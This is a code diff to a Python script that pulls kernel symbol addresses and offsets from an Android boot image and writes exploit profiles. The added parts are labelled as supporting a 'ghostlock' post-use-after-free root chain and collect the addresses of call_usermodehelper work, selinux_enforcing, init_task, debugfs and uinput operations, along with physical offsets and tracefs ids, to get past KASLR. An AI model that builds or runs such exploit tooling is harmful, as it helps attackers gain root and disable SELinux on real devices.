@@ -702,6 +702,28 @@ def build_profile(boot_path):
     off["groups"] = s64(syms["init_groups"])
     off["ucounts"] = s64(syms["init_ucounts"])
 
+    # ghostlock-s26 post-UAF / UMH root symbols (optional; present when found in kallsyms)
+    ghostlock_syms = (
+        "init_task",
+        "root_task_group",
+        "misc_list",
+        "uinput_misc",
+        "simple_attr_read",
+        "simple_attr_write",
+        "debugfs_u64_get",
+        "debugfs_u64_set",
+        "debugfs_u64_format",
+        "default_llseek",
+        "call_usermodehelper_exec_work",
+        "system_unbound_wq",
+        "selinux_enforcing",
+    )
+    for name in ghostlock_syms:
+        va = syms.get(name)
+        if va is not None:
+            key = "selinux_enforcing_off" if name == "selinux_enforcing" else name
+            off[key] = s64(va)
+
     release = extract_release(img)
     return {
         "release": release,
@@ -750,7 +772,13 @@ def render_conf(p, page_offset=-551903297536):
               "cred_cap_bset", "cred_cap_ambient", "cred_security", "cred_user",
               "cred_user_ns", "cred_ucounts", "cred_groups", "kitimer_size",
               "kitimer_node", "timer_link", "cred_link", "selinux_link",
-              "user_ns", "root_user", "groups", "ucounts"):
+              "user_ns", "root_user", "groups", "ucounts",
+              "init_task", "root_task_group", "misc_list", "uinput_misc",
+              "simple_attr_read", "simple_attr_write", "debugfs_u64_get",
+              "debugfs_u64_set", "debugfs_u64_format", "default_llseek",
+              "call_usermodehelper_exec_work", "system_unbound_wq",
+              "selinux_enforcing_off", "tracefs_worker_caller_off",
+              "phys_offset", "phys_load", "tracefs_event_id"):
         if o.get(k) is not None:
             lines.append(f"    {k} = {o[k]}")
     lines += [
@@ -785,7 +813,13 @@ def render_json(p, page_offset=-551903297536):
             "cred_cap_bset", "cred_cap_ambient", "cred_security", "cred_user",
             "cred_user_ns", "cred_ucounts", "cred_groups", "kitimer_size",
             "kitimer_node", "timer_link", "cred_link", "selinux_link",
-            "user_ns", "root_user", "groups", "ucounts") if o.get(k) is not None},
+            "user_ns", "root_user", "groups", "ucounts",
+            "init_task", "root_task_group", "misc_list", "uinput_misc",
+            "simple_attr_read", "simple_attr_write", "debugfs_u64_get",
+            "debugfs_u64_set", "debugfs_u64_format", "default_llseek",
+            "call_usermodehelper_exec_work", "system_unbound_wq",
+            "selinux_enforcing_off", "tracefs_worker_caller_off",
+            "phys_offset", "phys_load", "tracefs_event_id") if o.get(k) is not None},
         "_source": "img:" + p["meta"].get("source", "boot.img"),
         "_image_sha256": p["image_sha256"],
         "_boot_img_sha256": p["boot_sha256"],
@@ -807,10 +841,27 @@ def main():
                     help="输出 kallsyms 文本（未重定位 VA），原生体用它解 KASLR slide")
     ap.add_argument("--page-offset", type=lambda s: int(s, 0), default=-551903297536,
                     help="profile 里的 page_offset（默认 0xffffff7f80000000，即 SM8750 的假设值）")
+    ap.add_argument("--phys-offset", type=lambda s: int(s, 0), default=None,
+                    help="ghostlock post-UAF: phys_offset（如 0x80000000）")
+    ap.add_argument("--phys-load", type=lambda s: int(s, 0), default=None,
+                    help="ghostlock post-UAF: kernel phys load（如 0xc7800000）")
+    ap.add_argument("--tracefs-event-id", type=lambda s: int(s, 0), default=None,
+                    help="ghostlock post-UAF: tracefs sched_blocked_reason event id")
+    ap.add_argument("--tracefs-worker-caller-off", type=lambda s: int(s, 0), default=None,
+                    help="ghostlock post-UAF: tracefs worker caller offset")
     args = ap.parse_args()
 
     p = build_profile(args.boot_img)
     p["meta"]["source"] = args.boot_img.split("/")[-1]
+    # ghostlock-s26 post-UAF / UMH offsets (from boot.img analysis + device params)
+    if args.phys_offset is not None:
+        p["offsets"]["phys_offset"] = args.phys_offset
+    if args.phys_load is not None:
+        p["offsets"]["phys_load"] = args.phys_load
+    if args.tracefs_event_id is not None:
+        p["offsets"]["tracefs_event_id"] = args.tracefs_event_id
+    if args.tracefs_worker_caller_off is not None:
+        p["offsets"]["tracefs_worker_caller_off"] = args.tracefs_worker_caller_off
 
     conf_path = args.out or (p["release"] + ".conf")
     open(conf_path, "w").write(render_conf(p, args.page_offset))
